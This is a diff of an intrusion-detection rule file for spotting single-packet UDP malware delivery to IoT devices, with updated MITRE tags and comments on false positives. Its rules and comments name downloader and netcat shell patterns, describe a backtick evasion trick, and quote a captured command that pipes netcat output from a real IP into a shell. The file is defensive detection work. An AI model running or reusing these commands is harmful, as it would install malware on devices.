@@ -30,22 +30,22 @@
 # Anchored on a fetch verb PLUS a second token. Never match a bare "|sh" -
 # it false-positives against encrypted QUIC on high UDP ports.
 
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (wget)"; flow:to_server; dsize:40<>1500; content:"wget"; nocase; content:"http"; nocase; distance:0; within:64; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000001; rev:1;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (wget)"; flow:to_server; dsize:40<>1500; content:"wget"; nocase; content:"http"; nocase; distance:0; within:64; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0011, mitre_technique_id T1105, delivery_class single_packet_udp, worm_stage ingress_tool_transfer, created_at 2026_09_20; sid:1000001; rev:1;)
 
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (tftp)"; flow:to_server; dsize:40<>1500; content:"tftp"; nocase; pcre:"/\btftp\b[^\r\n]{0,48}(-[gilr]\b|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000002; rev:1;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (tftp)"; flow:to_server; dsize:40<>1500; content:"tftp"; nocase; pcre:"/\btftp\b[^\r\n]{0,48}(-[gilr]\b|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0011, mitre_technique_id T1105, delivery_class single_packet_udp, worm_stage ingress_tool_transfer, created_at 2026_09_20; sid:1000002; rev:1;)
 
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (curl)"; flow:to_server; dsize:40<>1500; content:"curl"; nocase; content:"http"; nocase; distance:0; within:64; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000003; rev:1;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (curl)"; flow:to_server; dsize:40<>1500; content:"curl"; nocase; content:"http"; nocase; distance:0; within:64; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0011, mitre_technique_id T1105, delivery_class single_packet_udp, worm_stage ingress_tool_transfer, created_at 2026_09_20; sid:1000003; rev:1;)
 
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (busybox applet)"; flow:to_server; dsize:40<>1500; content:"busybox"; nocase; pcre:"/busybox\s+(wget|tftp|ftpget|nc)\b/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000004; rev:1;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Downloader Payload (busybox applet)"; flow:to_server; dsize:40<>1500; content:"busybox"; nocase; pcre:"/busybox\s+(wget|tftp|ftpget|nc)\b/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0011, mitre_technique_id T1105, delivery_class single_packet_udp, worm_stage ingress_tool_transfer, created_at 2026_09_20; sid:1000004; rev:1;)
 
 # Must match BOTH forms. rev:1 required a literal "+x" and therefore missed
 # every octal-mode dropper - which is most of them: geico (all three campaign
 # tags), cling and Kataru all use "chmod 777". Only the realtek.selfrep-style
 # one-liners and family E's bins.sh use "+x". Measured 2026-09-20: rev:1
 # matched 2 of 8 real payloads, rev:2 matches 8 of 8.
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Payload Sets Executable Bit"; flow:to_server; dsize:40<>1500; content:"chmod"; nocase; pcre:"/chmod\s+(\+x|[0-7]{3,4})\s/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0002, mitre_technique_id T1222, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000005; rev:2;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Payload Sets Executable Bit"; flow:to_server; dsize:40<>1500; content:"chmod"; nocase; pcre:"/chmod\s+(\+x|[0-7]{3,4})\s/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0005, mitre_technique_id T1222.002, delivery_class single_packet_udp, worm_stage payload_preparation, created_at 2026_09_20; sid:1000005; rev:2;)
 
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Fetch Piped To Shell"; flow:to_server; dsize:40<>1500; content:"http"; nocase; content:"|7c|sh"; distance:0; within:256; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0002, mitre_technique_id T1059, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000006; rev:1;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Fetch Piped To Shell"; flow:to_server; dsize:40<>1500; content:"http"; nocase; content:"|7c|sh"; distance:0; within:256; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0002, mitre_technique_id T1059.004, delivery_class single_packet_udp, worm_stage execution, created_at 2026_09_20; sid:1000006; rev:1;)
 
 # Netcat fetch. Not every delivery uses an HTTP downloader: geico's ppppl3
 # path is "echo|nc <ip> <port> > a$$", pulling a raw ELF straight off a TCP
@@ -62,12 +62,12 @@ alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Fe
 #   echo|nc <ip> <port> > a$$      dropper script, redirect to file
 #   &nc <ip> <port>|sh             wire form, piped to a shell
 # "busybox nc" is already covered by 1000004.
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Netcat Fetch"; flow:to_server; dsize:40<>1500; content:"nc "; nocase; pcre:"/(^|[\s\;&\|\x60(])nc\s+(-\w+\s+)*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+\d{2,5}\b/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1105, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000008; rev:2;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Netcat Fetch"; flow:to_server; dsize:40<>1500; content:"nc "; nocase; pcre:"/(^|[\s\;&\|\x60(])nc\s+(-\w+\s+)*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+\d{2,5}\b/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0011, mitre_technique_id T1105, delivery_class single_packet_udp, worm_stage ingress_tool_transfer, created_at 2026_09_20; sid:1000008; rev:2;)
 
 # Doubled backtick is deliberate signature evasion - the shell collapses an
 # empty command substitution, so `` inside a filename splits the literal
 # string a naive content match would look for. Seen in RondoDox droppers.
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Payload Uses Empty Command Substitution Evasion"; flow:to_server; dsize:40<>1500; content:"|60 60|"; content:"http"; nocase; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0005, mitre_technique_id T1027, delivery_class single_packet_udp, created_at 2026_09_20; sid:1000007; rev:1;)
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Payload Uses Empty Command Substitution Evasion"; flow:to_server; dsize:40<>1500; content:"|60 60|"; content:"http"; nocase; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0005, mitre_technique_id T1027, delivery_class single_packet_udp, worm_stage evasion, created_at 2026_09_20; sid:1000007; rev:1;)
 
 # --- 10001xx: delivery-kit fingerprints ------------------------------------
 # Independent of BOTH source reputation and payload content, so these fire on
@@ -76,10 +76,36 @@ alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Single-Packet Pa
 # a checksum. 54321 is a common raw-socket constant, so treat a bare hit as
 # "some crafting kit", not as family attribution.
 
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Raw-Socket Kit Fingerprint (IPID 0xd431, UDP cksum 0)"; id:54321; fragbits:!D; udp.hdr; content:"|00 00|"; offset:6; depth:2; threshold:type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, delivery_class single_packet_udp, delivery_kit d431, created_at 2026_09_20; sid:1000010; rev:1;)
+# RECLASSIFIED rev:2. Measured over 3 days of live traffic: 39 of 53 hits on
+# this rule were internet-wide reconnaissance, not delivery. Every one carried
+# a protocol-VALID probe for the port it hit - NTP client packets, SNMP with
+# community "public", CLDAP objectclass searches, SSDP M-SEARCH, STUN binding,
+# ONVIF GetDeviceInformation, CoAP .well-known/core, SIP OPTIONS, IKE,
+# OpenVPN, a full QUIC CHLO with SNI www.google.com, and a DNS query for
+# "Dns-UDP-sCaN-0.iO.INTerNEtdATa.Io" which names itself. Sources were mostly
+# Hurricane Electric and AWS scan infrastructure.
+#
+# Size does not separate them: the QUIC probe is ~700 bytes and the SIP ones
+# ~400, larger than several real deliveries. What separates them is that a
+# delivery carries a COMMAND and a probe carries a PROTOCOL - which is what
+# 1000011 below tests, and why that rule has had no false positives.
+#
+# So this is a reconnaissance detector that also happens to see deliveries.
+# It stays enabled because it is the only rule that can see a vector nobody
+# has characterised yet, but it is classed and scored as recon. Treat a bare
+# hit as "some raw-socket kit", never as a delivery and never as attribution.
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Raw-Socket Kit Fingerprint - Recon Or Delivery (IPID 0xd431)"; flow:to_server; id:54321; fragbits:!D; udp.hdr; content:"|00 00|"; offset:6; depth:2; threshold:type limit, track by_src, count 1, seconds 600; classtype:network-scan; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Informational, mitre_tactic_id TA0043, mitre_technique_id T1595, delivery_class single_packet_udp, worm_stage reconnaissance, delivery_kit d431, created_at 2026_09_20; sid:1000010; rev:2;)
 
-# Composite: same kit AND a downloader verb. Highest-confidence rule here.
-alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Raw-Socket Kit Delivering Downloader Payload"; id:54321; fragbits:!D; udp.hdr; content:"|00 00|"; offset:6; depth:2; pkt_data; pcre:"/(wget|tftp|curl|busybox)/i"; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Critical, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, delivery_kit d431, created_at 2026_09_20; sid:1000011; rev:1;)
+# Composite: same kit AND a command. This is the actionable one - zero false
+# positives across the same 3 days, against 39 false positives on the bare
+# fingerprint above.
+#
+# rev:2 widens the verb set. rev:1 tested only (wget|tftp|curl|busybox) and
+# therefore MISSED the live geico ppppl3 delivery of 2026-09-20 13:26,
+# "'&nc 160.119.71.134 5959|sh&'ppppl3", which carries no HTTP downloader at
+# all. Adding nc and chmod catches it while still missing every protocol probe
+# listed above - verified against all six.
+alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Raw-Socket Kit Delivering Command Payload"; flow:to_server; id:54321; fragbits:!D; udp.hdr; content:"|00 00|"; offset:6; depth:2; pkt_data; pcre:"/(wget|tftp|curl|busybox|\bnc\s|chmod)/i"; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Critical, mitre_tactic_id TA0001, mitre_technique_id T1190, mitre_technique_id T1105, delivery_class single_packet_udp, worm_stage delivery, delivery_kit d431, created_at 2026_09_20; sid:1000011; rev:2;)
 
 # --- 10002xx: vector-specific ----------------------------------------------
 
@@ -94,17 +120,17 @@ alert udp any any -> $HOME_NET any (msg:"LOCAL IOT-DELIVERY UDP Raw-Socket Kit D
 #   +16   msg_type (0x40)
 #   +20   filler running up to the command placement
 #   +352  networkId (struct+0x150), ~32 bytes usable
-alert udp any any -> $HOME_NET 43561:43562 (msg:"LOCAL IOT-DELIVERY UDP Ruijie Easydisc Hello With Shell Metacharacter In networkId"; flow:to_server; dsize:>360; content:"|40|"; offset:16; depth:4; pcre:"/^.{352}[&|\;$<>'\x60\r\n]/s"; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, vector ruijie_easydisc, created_at 2026_09_20; sid:1000020; rev:1;)
+alert udp any any -> $HOME_NET 43561:43562 (msg:"LOCAL IOT-DELIVERY UDP Ruijie Easydisc Hello With Shell Metacharacter In networkId"; flow:to_server; dsize:>360; content:"|40|"; offset:16; depth:4; pcre:"/^.{352}[&|\;$<>'\x60\r\n]/s"; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, worm_stage exploitation, vector ruijie_easydisc, created_at 2026_09_20; sid:1000020; rev:1;)
 
 # IKE is a binary protocol. A URL inside a UDP/500 datagram is definitionally
 # anomalous and does not depend on knowing which Zyxel bug is being hit.
-alert udp any any -> $HOME_NET 500 (msg:"LOCAL IOT-DELIVERY UDP URL In IKE Datagram (Zyxel IKE RCE class)"; flow:to_server; content:"http|3a 2f 2f|"; nocase; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, vector zyxel_ike, created_at 2026_09_20; sid:1000021; rev:1;)
+alert udp any any -> $HOME_NET 500 (msg:"LOCAL IOT-DELIVERY UDP URL In IKE Datagram (Zyxel IKE RCE class)"; flow:to_server; content:"http|3a 2f 2f|"; nocase; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, worm_stage exploitation, vector zyxel_ike, created_at 2026_09_20; sid:1000021; rev:1;)
 
 # UDP/9999 - vector not attributed to a published CVE. Content-only.
-alert udp any any -> $HOME_NET 9999 (msg:"LOCAL IOT-DELIVERY UDP Downloader Payload On 9999"; flow:to_server; dsize:40<>1500; pcre:"/(wget|tftp|curl|busybox)/i"; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, vector udp9999, created_at 2026_09_20; sid:1000022; rev:1;)
+alert udp any any -> $HOME_NET 9999 (msg:"LOCAL IOT-DELIVERY UDP Downloader Payload On 9999"; flow:to_server; dsize:40<>1500; pcre:"/(wget|tftp|curl|busybox)/i"; classtype:attempted-admin; target:dest_ip; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, worm_stage exploitation, vector udp9999, created_at 2026_09_20; sid:1000022; rev:1;)
 
 # Realtek SDK / CVE-2021-35394, UDP/9034. ETOPEN already covers this vector;
 # this rule exists so delivery_class metadata is consistent across every
 # vector in the set. Duplicate alerting is the intended trade - comment it
 # out if that duplication is not wanted.
-alert udp any any -> $HOME_NET 9034 (msg:"LOCAL IOT-DELIVERY UDP Downloader Payload On 9034 (Realtek SDK)"; flow:to_server; dsize:40<>1500; pcre:"/(wget|tftp|curl|busybox)/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:cve,2021-35394; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, vector realtek_sdk, created_at 2026_09_20; sid:1000023; rev:1;)
+alert udp any any -> $HOME_NET 9034 (msg:"LOCAL IOT-DELIVERY UDP Downloader Payload On 9034 (Realtek SDK)"; flow:to_server; dsize:40<>1500; pcre:"/(wget|tftp|curl|busybox)/i"; threshold:type limit, track by_src, count 2, seconds 300; classtype:attempted-admin; target:dest_ip; reference:cve,2021-35394; reference:url,github.com/graphworlok/so-udp-delivery-detections; metadata:attack_target IoT_Device, deployment Perimeter, signature_severity Major, mitre_tactic_id TA0001, mitre_technique_id T1190, delivery_class single_packet_udp, worm_stage exploitation, vector realtek_sdk, created_at 2026_09_20; sid:1000023; rev:1;)
